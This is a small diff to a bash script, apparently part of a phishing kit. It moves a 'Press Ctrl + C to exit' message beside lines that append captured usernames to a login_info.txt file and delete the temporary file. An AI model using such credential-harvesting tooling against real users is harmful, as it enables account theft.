@@ -367,9 +367,9 @@ cat websites/$server/usernames.txt >> websites/$server/login_info.txt
 printf "\e[0m\n"
 printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
 printf "\n"
+printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
 rm -rf websites/$server/usernames.txt
 fi
-printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
 sleep 0.75
 
 done
